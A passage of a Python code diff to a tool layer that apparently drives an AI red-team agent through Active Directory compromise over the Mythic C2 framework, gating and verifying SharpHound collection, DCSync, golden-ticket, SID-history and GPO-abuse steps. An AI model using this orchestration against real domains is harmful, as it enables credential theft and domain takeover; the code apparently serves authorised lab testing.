+        if ticket_key and ticket_key not in getattr(self, "_deterministic_ticket_command_keys", set()):
+            self._pending_engagement_hop = None
+            return (
+                "[engagement-gate] Kerberos ticket command not attempted: ticket artifact commands must be "
+                "built with `build_capability_commands` and issued exactly as returned. Do not handcraft "
+                "Rubeus/Mimikatz ticket commands or add pass-the-ticket flags; use the builder's isolated "
+                "logon-context/ticket-store sequence and proof command."
+            )
         if classified is None:
             return None
 
@@ -1762,14 +2354,18 @@ class MythicTools:
             access_key = engagement_state.access_context_key(cg_state, fh) if fh is not None else ""
             if not access_key:
                 return None  # can't key it — fail-open, allow the collection
-            if access_key in self._collection_in_flight:
-                return ("[engagement-gate] skipped: a collection is already in-flight at this access level "
-                        f"({access_key}) — wait for ingest, then analyze; do NOT launch another SharpHound.")
+            in_flight_blocker = await self._collection_in_flight_blocker(access_key)
+            if in_flight_blocker:
+                return in_flight_blocker
             decision, _reason = engagement_state.gate_decision("collect-graph", access_key, cg_state)
             if decision == engagement_state.GateDecision.SKIP:
                 return (f"[engagement-gate] skipped: graph already built at this access level ({access_key}) "
                         "— analyze the existing graph or escalate; do NOT re-collect.")
-            self._collection_in_flight.add(access_key)
+            self._queue_task_backed_transition(
+                kind="collect-graph",
+                key=access_key,
+                callback_display_id=callback_display_id,
+            )
             self._pending_engagement_hop = None
             return None
 
@@ -1785,6 +2381,44 @@ class MythicTools:
                 rebind = intent_classifier.classify_tool_call(command, parameters, callback_host=cb_host)
                 if rebind is not None:
                     technique, target_key = rebind
+
+        # Domain Admin group membership checks are domain-scoped read-probes, but the command commonly
+        # carries only `/domain`. Bind them from the issuing callback's forest so a successful read records
+        # `da:<domain>` instead of an empty-target no-op.
+        if not target_key and technique == "domain-admin-membership-check":
+            cb_forest = next(
+                (f.forest for f in footholds if str(getattr(f, "callback_id", "")) == str(callback_display_id)),
+                "",
+            )
+            if cb_forest:
+                target_key = str(cb_forest).strip().casefold()
+
+        if technique in {"golden-ticket", "sid-history-escalation"} and (
+            not ticket_key or ticket_key not in getattr(self, "_deterministic_ticket_command_keys", set())
+        ):
+            self._pending_engagement_hop = None
+            return (
+                "[engagement-gate] ticket forge not attempted: golden-ticket/SID-history commands must be "
+                "built with the deterministic capability builder (`build_capability_commands` for "
+                "`forge-golden-ticket` or `ensure-kerberos-context`) and issued exactly as the "
+                "builder-emitted Kerberos forge command. "
+                "Do not handcraft Rubeus, Mimikatz, execute_assembly, or raw split forms; they caused "
+                "false-achieved ledger entries, argument-splitting churn, and current-session ticket misuse. "
+                "Ticket use must go through the builder's isolated logon-context/ticket-store sequence, not "
+                "tool-level pass-the-ticket arguments. "
+                "Issue the exact command object returned by `build_capability_commands`; changing SID/key/"
+                "domain fields invalidates the deterministic builder proof."
+            )
+        ticket_context = (
+            getattr(self, "_deterministic_ticket_command_contexts", {}).get(ticket_key, {})
+            if ticket_key else {}
+        )
+        if (
+            technique in {"golden-ticket", "sid-history-escalation"}
+            and str(ticket_context.get("capability") or "").casefold() == "ensure-kerberos-context"
+        ):
+            self._pending_engagement_hop = None
+            return None
 
         # Lazily refresh graph facts (TTL-bounded; retries while the cache is empty) so an async-completed
         # ingest is picked up on a later gate call — without it the chain never sees the graph if ingest
@@ -1890,7 +2524,42 @@ class MythicTools:
         )
 
     def _engagement_objective(self) -> str:
+        if SAGE_ENGAGEMENT_OBJECTIVE:
+            return SAGE_ENGAGEMENT_OBJECTIVE
+        objective = self._refresh_engagement_objective_from_ledger()
+        if objective:
+            return objective
         return f"sage-engagement:{self.agent_task_id}" if self.agent_task_id else "sage-engagement"
+
+    @staticmethod
+    def _human_engagement_objective(value) -> str:
+        text = str(value or "").strip()
+        if not text:
+            return ""
+        lowered = text.casefold()
+        if lowered == "sage-engagement" or lowered.startswith("sage-engagement:"):
+            return ""
+        return text
+
+    def _refresh_engagement_objective_from_ledger(self) -> str:
+        """Return the human/operator objective from the active ledger, if one exists.
+
+        The operator-facing `state objective ...` command edits the same durable ledger while Sage may
+        already be running. Refreshing here prevents later write-throughs from replacing that objective with
+        the fallback `sage-engagement:<task>` identifier.
+        """
+        try:
+            path = self._engagement_ledger_path()
+            if os.path.exists(path):
+                with open(path, "r", encoding="utf-8") as fh:
+                    payload = json.load(fh)
+                if isinstance(payload, dict):
+                    objective = self._human_engagement_objective(payload.get("objective"))
+                    if objective:
+                        self._engagement_objective_text = objective
+        except Exception:
+            pass
+        return self._engagement_objective_text
 
     _CRED_CACHE_TTL_SECONDS = 60
 
@@ -1957,7 +2626,7 @@ class MythicTools:
         # 1. Credential store -> creds:{account@realm}, krbtgt-hash:{realm} (the dcsync/lsass artifacts).
         try:
             for c in await self._fetch_credentials_cached(now):
-                acct = str(c.get("account") or "").strip().casefold()
+                acct = self._canonical_credential_account(c.get("account"))
                 realm = str(c.get("realm") or "").strip().casefold()
                 if not str(c.get("credential_text") or "").strip():
                     continue
@@ -2000,10 +2669,40 @@ class MythicTools:
                 import engagement_state
                 import graph_reconciler
 
-            # Only TTL-skip when we ALREADY HAVE facts. An empty cache means the graph wasn't populated yet
-            # (ingest is async ~40s) — keep retrying on each gate call until it lands, else the chain never
-            # sees the graph (the 2026-06-09 false-negative: ingest completed late, cache stayed empty).
-            if not force and self._engagement_graph_facts and self._engagement_graph_facts_ts:
+            # Need footholds to derive the controlled principals the cypher matches on. Use the gate's
+            # cache if present; otherwise reconcile once (collection tools aren't classified, so the cache
+            # may be empty right after the first ingest — before any attack hop has run through the gate).
+            footholds = list(getattr(self, "_engagement_footholds", []) or [])
+            if not footholds:
+                try:
+                    footholds = await access_reconciler.reconcile_access(self, now)
+                    self._engagement_footholds = list(footholds)
+                except Exception:
+                    footholds = []
+
+            state = engagement_state.EngagementState(
+                objective=self._engagement_objective(),
+                footholds=footholds,
+                hops=list(self._engagement_hops),
+                graph_facts=list(getattr(self, "_engagement_graph_facts", []) or []),
+            )
+            principals = graph_reconciler.controlled_principals_from_state(state)
+            credential_domains = graph_reconciler.credential_target_domains_from_state(state)
+            if not principals and not credential_domains:
+                logger.info(
+                    f"🧭 [graph-facts] refresh skipped: 0 controlled principals/domains "
+                    f"(footholds={len(footholds)}, alive={sum(1 for f in footholds if getattr(f, 'alive', False))})"
+                )
+                return
+
+            # Only TTL-skip when we ALREADY HAVE facts and those facts cover the current control horizon.
+            # A new DA/kerberos-context can unlock DCSync over a domain after the last graph refresh; in that
+            # case we must query again immediately so BloodHound can surface useful real-user targets.
+            missing_domain_targets = _graph_facts_missing_credential_domains(
+                getattr(self, "_engagement_graph_facts", []) or [],
+                credential_domains,
+            )
+            if not force and self._engagement_graph_facts and self._engagement_graph_facts_ts and not missing_domain_targets:
                 last = engagement_state._parse_iso(self._engagement_graph_facts_ts)
                 cur = engagement_state._parse_iso(now)
                 if last is not None and cur is not None:
@@ -2026,30 +2725,6 @@ class MythicTools:
                 logger.info("🧭 [graph-facts] refresh skipped: BloodHound cypher_query tool not resolvable")
                 return
 
-            # Need footholds to derive the controlled principals the cypher matches on. Use the gate's
-            # cache if present; otherwise reconcile once (collection tools aren't classified, so the cache
-            # may be empty right after the first ingest — before any attack hop has run through the gate).
-            footholds = list(getattr(self, "_engagement_footholds", []) or [])
-            if not footholds:
-                try:
-                    footholds = await access_reconciler.reconcile_access(self, now)
-                    self._engagement_footholds = list(footholds)
-                except Exception:
-                    footholds = []
-
-            state = engagement_state.EngagementState(
-                objective=self._engagement_objective(),
-                footholds=footholds,
-                hops=list(self._engagement_hops),
-            )
-            principals = graph_reconciler.controlled_principals_from_state(state)
-            if not principals:
-                logger.info(
-                    f"🧭 [graph-facts] refresh skipped: 0 controlled principals "
-                    f"(footholds={len(footholds)}, alive={sum(1 for f in footholds if getattr(f, 'alive', False))})"
-                )
-                return
-
             class _SingleToolMCP:
                 """Adapter: graph_reconciler.reconcile_graph_position expects a get_tool_by_name(name)
                 accessor; the live MCPManager exposes get_tools_by_server instead. We already resolved the
@@ -2065,12 +2740,17 @@ class MythicTools:
             facts = list(await graph_reconciler.reconcile_graph_position(
                 _SingleToolMCP(cypher_tool), principals, state.objective, now,
                 self._GRAPH_FACTS_TTL_SECONDS,
+                credential_domains=credential_domains,
             ) or [])
             # Non-clobbering: a pending/empty reconcile (graph not ingested yet) must NOT wipe good facts
             # from a prior refresh. Only overwrite when this reconcile actually returned edges.
             if facts:
                 self._engagement_graph_facts = facts
                 self._engagement_graph_facts_ts = now
+                try:
+                    self._persist_engagement_ledger()
+                except Exception:
+                    pass
             logger.info(
                 f"🧭 [graph-facts] refresh: principals={len(principals)} new_facts={len(facts)} "
                 f"cached={len(self._engagement_graph_facts)} "
@@ -2079,6 +2759,115 @@ class MythicTools:
         except Exception as exc:
             logger.info(f"🧭 [graph-facts] refresh error (fail-open): {exc}")
             # fail-open: planner suggestions are best-effort, never break the issue path
+
+    def _queue_task_backed_transition(
+        self,
+        *,
+        kind: str,
+        key: str,
+        callback_display_id: int | str,
+    ) -> None:
+        """Stage an operational transition that can be committed only after Mythic creates a real task."""
+        self._pending_task_backed_transition = {
+            "kind": str(kind or ""),
+            "key": str(key or ""),
+            "callback_id": str(callback_display_id or ""),
+            "queued_at": datetime.now(timezone.utc).isoformat(),
+        }
+
+    def _commit_task_backed_transition(
+        self,
+        command: str,
+        parameters,
+        callback_display_id: int | str,
+        task_display_id: int | str,
+    ) -> None:
+        """Convert a queued transition into task-backed transient state.
+
+        The invariant is simple: classifier/gate decisions can stage intent, but operational state is committed
+        only when Mythic returns a concrete task display_id for the command that will produce the effect.
+        """
+        pending = getattr(self, "_pending_task_backed_transition", None)
+        self._pending_task_backed_transition = None
+        if not pending:
+            return
+        if str(pending.get("callback_id") or "") != str(callback_display_id or ""):
+            return
+        key = str(pending.get("key") or "")
+        if not key:
+            return
+        if str(pending.get("kind") or "") == "collect-graph":
+            self._collection_in_flight[key] = {
+                "kind": "collect-graph",
+                "key": key,
+                "task_id": str(task_display_id),
+                "callback_id": str(callback_display_id),
+                "command": str(command or ""),
+                "parameters_preview": str(parameters)[:300],
+                "created_at": datetime.now(timezone.utc).isoformat(),
+            }
+            logger.info(
+                "🧭 [task-backed-transition] collect-graph in-flight key=%s task=%s callback=%s",
+                key,
+                task_display_id,
+                callback_display_id,
+            )
+
+    async def _collection_in_flight_blocker(self, access_key: str) -> str | None:
+        """Return a collect-graph SKIP message only when the marker is backed by a real Mythic task.
+
+        Stale/unbacked markers are invalidated and the caller should proceed to launch collection.
+        """
+        record = self._collection_in_flight.get(access_key)
+        if not record:
+            return None
+        if not isinstance(record, dict):
+            self._collection_in_flight.pop(access_key, None)
+            return None
+        task_id = str(record.get("task_id") or "").strip()
+        callback_id = str(record.get("callback_id") or "").strip()
+        if not task_id or not callback_id:
+            self._collection_in_flight.pop(access_key, None)
+            logger.info("🧭 [task-backed-transition] invalidated unbacked collect-graph marker key=%s", access_key)
+            return None
+        try:
+            tasks = await mythic.get_all_tasks(mythic=self.client, callback_display_id=int(callback_id))
+        except Exception:
+            tasks = []
+        task = next((t for t in tasks or [] if str(t.get("display_id")) == task_id), None)
+        if task is None:
+            self._collection_in_flight.pop(access_key, None)
+            logger.info(
+                "🧭 [task-backed-transition] invalidated collect-graph marker key=%s missing_task=%s",
+                access_key,
+                task_id,
+            )
+            return None
+        status = str(task.get("status") or "").strip()
+        completed = bool(task.get("completed"))
+        status_cf = status.casefold()
+        if completed and any(marker in status_cf for marker in ("error", "fail", "cancel")):
+            self._collection_in_flight.pop(access_key, None)
+            logger.info(
+                "🧭 [task-backed-transition] invalidated failed collect-graph marker key=%s task=%s status=%s",
+                access_key,
+                task_id,
+                status,
+            )
+            return None
+        if completed:
+            return (
+                "[engagement-gate] skipped: graph collection already launched and completed for this access "
+                f"level ({access_key}) by Mythic task #{task_id} status={status!r}. Do NOT launch another "
+                "collector. Inspect that task output, list the configured output directory, download the ZIP, "
+                "and ingest it into BloodHound. If no artifact exists and the task output proves failure, report "
+                "that failed task instead of trusting an unproven in-flight marker."
+            )
+        return (
+            "[engagement-gate] skipped: graph collection is already in-flight for this access level "
+            f"({access_key}) as Mythic task #{task_id} status={status!r}. Wait for that task or inspect task "
+            "history/output; do NOT launch another SharpHound."
+        )
 
     async def _record_graph_built(self, callback_display_id, verified: bool) -> None:
         """Record the collect-graph effect (graph-built at the resolving callback's access level) on a
@@ -2111,7 +2900,7 @@ class MythicTools:
             access_key = engagement_state.access_context_key(state, fh)
             if not access_key:
                 return
-            self._collection_in_flight.discard(access_key)
+            self._collection_in_flight.pop(access_key, None)
             if not verified:
                 return
             updated = engagement_state.record_hop_result(
@@ -2138,12 +2927,9 @@ class MythicTools:
                 import engagement_state
             technique, target_key, now = pending
 
-            # Verify-on-record: credential-dump techniques only record `achieved` when the output
-            # actually contains a usable secret (a real NTLM/AES/RC4 key) — not merely because the
-            # task lacked a known failure signature. An 8439 DS_DRA_BAD_DN DCSync "succeeds" at the
-            # Mythic layer but returns no key; recording it `achieved` was the false-achieved ledger
-            # bug that made the agent forge with a placeholder key. Non-credential techniques keep the
-            # legacy behavior (record `achieved` unless the output is a known failure signature).
+            # Verify-on-record: high-value modeled effects record `achieved` only when the task output
+            # contains the artifact that proves the effect. Mythic task success is transport status, not
+            # effect proof.
             status = "achieved"
             extra: dict = {}
             if technique in credential_artifacts.CREDENTIAL_TECHNIQUES:
@@ -2199,8 +2985,137 @@ class MythicTools:
                         f"🔒 [verify-on-record] {technique} {target_key}: NO applied DS-Replication ACE in "
                         f"task output (verdict={verdict}) — recording FAILED, not achieved (the grant did not land)."
                     )
-            elif _is_task_failure_output(results_str):
-                # Legacy non-credential path: a known failure signature means no hop is recorded.
+            elif technique in credential_artifacts.TICKET_TECHNIQUES:
+                # Strict ticket verification (2026-06-11 false-achieved SID-history bug): Rubeus/Mimikatz
+                # can return Mythic "success" while the ticket forge failed, or while only a forge/inject
+                # attempt occurred. A ticket hop achieves da:<domain> only when a usable-ticket/access proof is
+                # present (Domain/Enterprise Admin membership, explicit valid-ticket proof, or service access).
+                # Correlate the proof to the EFFECT's domain (the PARENT for sid-history, whose effect is
+                # da:{parent}) so a child-domain group/access line cannot prove a parent-domain effect.
+                probe = credential_artifacts.extract_ticket_probe(
+                    results_str, expected_domain=self._ticket_effect_domain(technique, target_key)
+                )
+                verdict = engagement_state.verify_effect(technique, target_key, probe)
+                status = "achieved" if verdict == "achieved" else "failed"
+                artifact_present = bool(
+                    probe.get("domain_admin")
+                    or probe.get("ticket_valid")
+                    or probe.get("service_access_proven")
+                )
+                extra = {
+                    "verified_on_record": True,
+                    "verify_verdict": verdict,
+                    "artifact_present": artifact_present,
+                    "ticket_forged": bool(probe.get("ticket_forged")),
+                    "tgt_present": bool(probe.get("tgt_present")),
+                    "ticket_error": bool(probe.get("ticket_error")),
+                    "member_of": list(probe.get("member_of") or []),
+                }
+                if status != "achieved":
+                    if self._prior_verified_credential_hop(technique, target_key) is not None:
+                        logger.info(
+                            f"🔒 [verify-on-record] {technique} {target_key}: ticket proof absent/failed, "
+                            f"but a prior VERIFIED achieved hop exists — keeping it, not downgrading."
+                        )
+                        return
+                    logger.warning(
+                        f"🔒 [verify-on-record] {technique} {target_key}: no usable ticket/access proof "
+                        f"(verdict={verdict}) — recording FAILED, not achieved."
+                    )
+            elif technique == "domain-admin-membership-check":
+                # No output-echo domain correlation here: a `net group "Domain Admins" /domain` is implicitly
+                # scoped to the foothold's own domain and does not echo the domain name to correlate against.
+                # The deny-only filter, entry-shape check, and benign-string removal still apply via the probe.
+                probe = self._extract_domain_admin_membership_probe(results_str)
+                verdict = engagement_state.verify_effect(technique, target_key, probe)
+                status = "achieved" if verdict == "achieved" else "failed"
+                extra = {
+                    "verified_on_record": True,
+                    "verify_verdict": verdict,
+                    "artifact_present": bool(probe.get("domain_admin")),
+                    "principal_candidates": list(probe.get("principal_candidates") or []),
+                }
+                if status != "achieved":
+                    logger.info(
+                        f"🔒 [verify-on-record] {technique} {target_key}: Domain Admin membership not proven "
+                        f"(verdict={verdict}) — recording failed/partial evidence, not da:{target_key}."
+                    )
+            elif technique == "gpo-abuse":
+                # Legacy SharpGPOAbuse writes are setup, not proof. A clean "GPO was modified; wait for refresh"
+                # output means the GPO artifact exists and may apply later; it must not satisfy system:{gpo} or
+                # unlock DCSync. Only observed SYSTEM execution records achieved.
+                if _record_output_is_failure(results_str):
+                    logger.warning(
+                        f"🔒 [verify-on-record] {technique} {target_key}: task output empty/failed for GPO "
+                        f"abuse (preview={str(results_str)[:120]!r}) — NOT recording achieved."
+                    )
+                    return
+                if _gpo_abuse_guid_only_noop(results_str):
+                    status = "failed"
+                    extra = {
+                        "verified_on_record": True,
+                        "verify_verdict": "failed",
+                        "verify_reason": "SharpGPOAbuse resolved the GPO GUID but did not report a modification",
+                        "artifact_present": False,
+                        "probe": {"gpo_guid_resolved": True, "gpo_modified": False},
+                    }
+                    logger.info(
+                        f"🔒 [verify-on-record] {technique} {target_key}: SharpGPOAbuse GUID-only output "
+                        "is a no-op — recording failed, not pending/achieved."
+                    )
+                else:
+                    try:
+                        try:
+                            from . import capabilities
+                        except ImportError:
+                            import capabilities
+                        probe = capabilities.extract_gpo_system_exec_probe(results_str)
+                        verification = capabilities.verify_gpo_controlled_system_exec(probe)
+                        if verification.verdict == "achieved":
+                            status = "achieved"
+                        elif verification.verdict == "blocked":
+                            status = "blocked"
+                        elif verification.verdict == "partial":
+                            status = "pending"
+                        else:
+                            status = "failed"
+                        extra = {
+                            "verified_on_record": True,
+                            "verify_verdict": verification.verdict,
+                            "verify_reason": verification.reason,
+                            "artifact_present": verification.verdict == "achieved",
+                            "probe": dict(verification.evidence),
+                        }
+                        if status != "achieved":
+                            logger.info(
+                                f"🔒 [verify-on-record] {technique} {target_key}: GPO setup is not execution proof "
+                                f"(verdict={verification.verdict}) — recording {status}, not achieved."
+                            )
+                    except Exception:
+                        if _record_output_is_failure(results_str):
+                            logger.warning(
+                                f"🔒 [verify-on-record] {technique} {target_key}: task output empty/failed for GPO "
+                                f"abuse (preview={str(results_str)[:120]!r}) — NOT recording achieved."
+                            )
+                            return
+                        status = "pending"
+                        extra = {
+                            "verified_on_record": True,
+                            "verify_verdict": "partial",
+                            "verify_reason": "GPO modified but execution proof unavailable",
+                            "artifact_present": False,
+                        }
+            elif _record_output_is_failure(results_str):
+                # Legacy / no-probe technique: with NO artifact to verify, record `achieved`
+                # ONLY when the task produced clean output. Empty output or a Mythic/agent error (task errored
+                # at CREATION, .NET assembly not registered, traceback, arg-format failure) is NOT success —
+                # record nothing so the hop can be retried. Closes the 2026-06-12 gpo-abuse false-achieved:
+                # SharpGPOAbuse errored "no assembly by that name" (task never ran) yet recorded achieved,
+                # because the narrow breaker list missed the Mythic creation-error traceback.
+                logger.warning(
+                    f"🔒 [verify-on-record] {technique} {target_key}: task output empty/failed for a no-probe "
+                    f"technique (preview={str(results_str)[:120]!r}) — NOT recording achieved."
+                )
                 return
 
             state = engagement_state.EngagementState(
@@ -2208,17 +3123,47 @@ class MythicTools:
                 footholds=[],
                 hops=list(self._engagement_hops),
             )
-            updated = engagement_state.record_hop_result(
-                state,
-                technique,
-                target_key,
-                status,
-                {"source": "issue_task", "provenance": "run", "result_preview": str(results_str)[:200],
-                 "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
-                 "callback_id": getattr(self, "_last_issued_callback_id", None),
-                 **extra},
-                now,
-            )
+            evidence = {
+                "source": "issue_task",
+                "provenance": "run",
+                "result_preview": str(results_str)[:200],
+                "mythic_task_id": getattr(self, "_last_issued_task_display_id", None),
+                "callback_id": getattr(self, "_last_issued_callback_id", None),
+                **extra,
+            }
+            context_effect = ""
+            if status == "achieved" and technique in {
+                "golden-ticket",
+                "sid-history-escalation",
+            }:
+                primary_effect = engagement_state._technique_effect(technique, target_key)
+                prefix, _, effect_domain = primary_effect.partition(":")
+                callback_id = str(getattr(self, "_last_issued_callback_id", "") or "").strip().casefold()
+                if prefix in {"da", "ea"} and effect_domain and callback_id:
+                    context_effect = f"kerberos-context:{effect_domain}@callback:{callback_id}"
+
+            if context_effect:
+                primary_effect = engagement_state._technique_effect(technique, target_key)
+                updated = engagement_state.record_effect_result(
+                    state,
+                    technique,
+                    target_key,
+                    primary_effect,
+                    status,
+                    evidence,
+                    now,
+                    preconditions=engagement_state._technique_preconditions(technique, target_key),
+                    satisfied_effects=[primary_effect, context_effect],
+                )
+            else:
+                updated = engagement_state.record_hop_result(
+                    state,
+                    technique,
+                    target_key,
+                    status,
+                    evidence,
+                    now,
+                )
             self._engagement_hops = updated.hops
             # Write-through to the durable per-engagement ledger so the hop survives runs/restarts.
             try:
@@ -2227,6 +3172,6732 @@ class MythicTools:
                 pass  # fail-open: persistence must never break the issue path
         finally:
             self._pending_engagement_hop = None
+
+    def _ticket_effect_domain(self, technique: str, target_key: str) -> str:
+        """The domain of the EFFECT a ticket technique records. For sid-history-escalation the effect is
+        da:{parent}, so proof must correlate to the PARENT domain (one DNS label up), not the child target.
+        Generic (no GOAD priors): a child is assumed one label deeper than its parent, true for AD subdomains."""
+        tk = str(target_key or "").strip()
+        if technique == "sid-history-escalation":
+            parts = tk.split(".")
+            if len(parts) > 2:
+                return ".".join(parts[1:])
+        return tk
+
+    def _is_replication_access_denied(self, low: str) -> bool:
+        """True ONLY for DS_DRA_ACCESS_DENIED (a real replication-RIGHTS denial): hresult 0x2105 / 8453, or
+        explicit access-denied text. NOTE: 0x20f7 / 8439 is DS_DRA_BAD_DN (a malformed DN / name-resolution
+        error — fix the /user DN, e.g. qualify with the NETBIOS short name), NOT a rights denial, so it must
+        NOT downgrade a rights hop. (Forge 2026-06-12: the first version keyed on the wrong hresult.)"""
+        if "0x00002105" in low or "0x2105" in low or "ds_dra_access_denied" in low:
+            return True
+        if "replication access was denied" in low:
+            return True
+        return (
+            re.search(r"(?<![0-9a-fx])8453(?![0-9])", low) is not None
+            and any(k in low for k in ("getncchanges", "drsr", "dcsync", "replicat"))
+        )
+
+    def _dcsync_params_dict(self, parameters):
+        p = parameters
+        if isinstance(p, str):
+            try:
+                p = json.loads(p)
+            except Exception:
+                return None
+        return p if isinstance(p, dict) else None
+
+    def _is_dcsync_command(self, command, parameters) -> bool:
+        """True when the issued command is a DCSync / DRSUAPI replication request — native `dcsync`, an
+        `lsadump::dcsync` string, OR the mimikatz-via-execute_pe {Domain, User, DC} param shape. Gates the
+        downgrade/hint so unrelated output with a stray '8453'/domain string can't trip it."""
+        blob = (str(command) + " " + str(parameters)).casefold()
+        if "dcsync" in blob or "drsuapi" in blob or "getncchanges" in blob:
+            return True
+        p = self._dcsync_params_dict(parameters)
+        if p is not None:
+            keys = {k.lower() for k in p.keys()}
+            if "user" in keys and "domain" in keys and "dc" in keys:
+                return True
+        return False
+
+    def _refutation_domain(self, command, parameters) -> str:
+        """The domain a replication-denied error is about — from the ISSUED command's `/domain:` flag or its
+        `Domain` param key (never parsed from tool OUTPUT, which can echo a different domain than was denied)."""
+        blob = " ".join(str(x) for x in (parameters, command) if x is not None)
+        m = re.search(r"/domain:([A-Za-z0-9._-]+)", blob)
+        if m:
+            return m.group(1).strip().strip('"\'').casefold()
+        p = self._dcsync_params_dict(parameters)
+        if p is not None:
+            for k, v in p.items():
+                if k.lower() == "domain" and isinstance(v, str) and v.strip():
+                    return v.strip().casefold()
+        return ""
+
+    def _apply_contradiction_downgrade(self, command, parameters, results_str) -> None:
+        """When a task fails with an error that REFUTES a claimed-achieved precondition, downgrade that hop so
+        the false premise REOPENS instead of the agent retrying the dependent action forever (the 8439-×8 loop).
+        Canonical case: a dcsync returning DS_DRA_ACCESS_DENIED (8439 / 0x20f7) proves the actor does NOT hold
+        DS-Replication rights on that domain — refuting da:/ea:/ds-replication-rights: for it. Intentionally
+        decisive: even if the actor IS a real DA whose ticket/context was wrong, REOPENING the hop (re-verify, or
+        fix the Kerberos execution context) is correct and cheap; an unbreakable retry loop is not."""
+        if not ENGAGEMENT_GATE_ENABLED:
+            return
+        if not self._is_dcsync_command(command, parameters):
+            return  # only a dcsync/replication command's ACCESS_DENIED can refute replication rights
+        low = str(results_str or "").casefold()
+        if not self._is_replication_access_denied(low):
+            return
+        domain = self._refutation_domain(command, parameters)
+        if not domain:
+            return
+        try:
+            from . import engagement_state
+        except ImportError:
+            import engagement_state
+        targets = {f"{p}{domain}" for p in ("da:", "ea:", "ds-replication-rights:")}
+        now = datetime.now(timezone.utc).isoformat()
+        state = engagement_state.EngagementState(
+            objective=self._engagement_objective(), footholds=[], hops=list(self._engagement_hops),
+        )
+        downgraded: list[str] = []
+        for hop in list(self._engagement_hops):
+            if self._capability_text(getattr(hop, "status", "")).casefold() != "achieved":
+                continue
+            ev_existing = getattr(hop, "evidence", {}) or {}
+            if isinstance(ev_existing, dict) and (ev_existing.get("verified_on_record") or ev_existing.get("artifact_present")):
+                continue  # a hop backed by REAL proof is not a false premise; a later denial is a context issue
+            effects = {self._capability_text(getattr(hop, "effect", "")).casefold()}
+            effects.update(self._capability_text(e).casefold() for e in (getattr(hop, "satisfied_effects", []) or []))
+            if not (effects & targets):
+                continue
+            evidence = {
+                "source": "contradiction-downgrade",
+                "provenance": "run",
+                "contradicted_by_command": self._capability_text(command),
+                "contradicted_by_task": getattr(self, "_last_issued_task_display_id", None),
+                "refutation": f"replication ACCESS_DENIED (0x2105/8453) on {domain}: the actor lacks DS-Replication rights",
+                "note": "this effect could not produce the dependent action; re-verify it, or fix the Kerberos "
+                        "execution context if you hold a valid DA ticket. Do NOT blindly retry the dcsync.",
+            }
+            state = engagement_state.record_effect_result(
+                state, getattr(hop, "technique", ""), getattr(hop, "target", ""),
+                self._capability_text(getattr(hop, "effect", "")), "failed", evidence, now,
+                preconditions=list(getattr(hop, "preconditions", []) or []),
+                satisfied_effects=list(getattr(hop, "satisfied_effects", []) or []),
+            )
+            downgraded.append(self._capability_text(getattr(hop, "effect", "")))
+        if downgraded:
+            self._engagement_hops = state.hops
+            try:
+                self._persist_engagement_ledger()
+            except Exception:
+                pass
+            logger.warning(
+                f"🔻 [contradiction-downgrade] {command} returned replication ACCESS_DENIED for {domain} — "
+                f"downgraded {downgraded} achieved->failed (false premise reopened, not a retry)."
+            )
+
+    def _assembly_name_from_params(self, parameters) -> str:
+        """The by-name assembly reference (e.g. 'SharpGPOAbuse.exe') from execute_assembly params, or '' when
+        the upload/file group is used (a UUID/path is not a registered-assembly name)."""
+        p = parameters
+        if isinstance(p, str):
+            try:
+                p = json.loads(p)
+            except Exception:
+                return ""
+        if not isinstance(p, dict):
+            return ""
+        for key in ("Assembly", "assembly", "assembly_name", "filename", "Filename"):
+            v = p.get(key)
+            if isinstance(v, str) and v.strip() and re.search(r"\.(exe|dll)$", v.strip(), re.IGNORECASE):
+                return v.strip()
+        return ""
+
+    async def _ensure_assembly_file_available(self, command, parameters, callback_display_id) -> None:
+        """Ensure a by-name Apollo assembly reference exists in Mythic filemeta before task creation.
+
+        Apollo's server-side create_go_tasking resolves `assembly_name` to an `assembly_id` from Mythic
+        filemeta. The callback then downloads and caches the bytes lazily if its encrypted file store does not
+        already have them. Hidden `register_assembly` tasking is therefore unnecessary here and creates noisy,
+        duplicate "registered" tasks across Sage restarts.
+        """
+        if _normalize_command_name(command) not in {"execute_assembly", "inline_assembly"}:
+            return
+        name = self._assembly_name_from_params(parameters)
+        if not name:
+            return  # upload/file group, or no assembly name
+        key = name.casefold()
+        if key in self._assembly_file_checks:
+            return
+        if await self._assembly_available_in_schema(command, name, callback_display_id):
+            self._assembly_file_checks.add(key)
+            return
+        try:
+            up = json.loads(await self.ensure_tool_uploaded(name))
+        except Exception as e:
+            logger.debug(f"assembly-file-preflight: ensure_tool_uploaded({name}) failed: {e}")
+            return
+        if up.get("status") not in {"uploaded", "already_present"} or not up.get("file_uuid"):
+            return  # tool not available — let the normal path surface the missing-tool result
+        self._assembly_file_checks.add(key)
+        await self._invalidate_command_schema_cache(command, callback_display_id)
+
+    async def _assembly_available_in_schema(self, command: str, name: str, callback_display_id) -> bool:
+        """Return true when Mythic already exposes the assembly in the command schema choices.
+
+        Some Mythic schema queries do not include dynamic query-function choices, so false means "unknown",
+        not "absent".
+        """
+        try:
+            schema = await self._fetch_command_schema(command, callback_display_id)
+        except Exception:
+            schema = None
+        if not isinstance(schema, list):
+            return False
+        wanted = self._capability_text(name).strip().casefold()
+        if not wanted:
+            return False
+        for param in schema:
+            if not isinstance(param, dict):
+                continue
+            param_name = self._capability_text(param.get("name") or param.get("cli_name")).casefold()
+            if param_name not in {"assembly", "assembly_name", "filename"}:
+                continue
+            choices = param.get("choices")
+            if not isinstance(choices, list):
+                continue
+            for choice in choices:
+                choice_text = self._capability_text(choice).strip().casefold()
+                if choice_text == wanted:
+                    return True
+        return False
+
+    async def _invalidate_command_schema_cache(self, command: str, callback_display_id) -> None:
+        try:
+            payload_type = await self._resolve_payload_type(callback_display_id)
+            if payload_type and hasattr(self, "_cmd_schema_cache"):
+                self._cmd_schema_cache.pop((payload_type, command), None)
+        except Exception:
+            return
+
+    def _normalize_dcsync_user(self, user, domain) -> str:
+        """Normalize a dcsync target user to NETBIOS\\sAMAccountName. Handles bare ('krbtgt'), FQDN
+        ('dom.fqdn\\krbtgt'), DN ('CN=krbtgt,CN=Users,DC=...'), and user@domain forms. The bare/FQDN/DN forms
+        are ambiguous or invalid to the DC's CrackNames (ERROR_NOT_UNIQUE / BAD_DN 8439); NETBIOS\\sam is exact."""
+        u = str(user or "").strip()
+        if not u:
+            return u
+        netbios = str(domain or "").strip().split(".", 1)[0].upper()
+        m = re.match(r"(?i)\s*cn=([^,]+),", u)  # DN -> sAMAccountName
+        if m:
+            acct = m.group(1).strip()
+        elif "\\" in u:
+            acct = u.rsplit("\\", 1)[1].strip()
+        elif "@" in u:
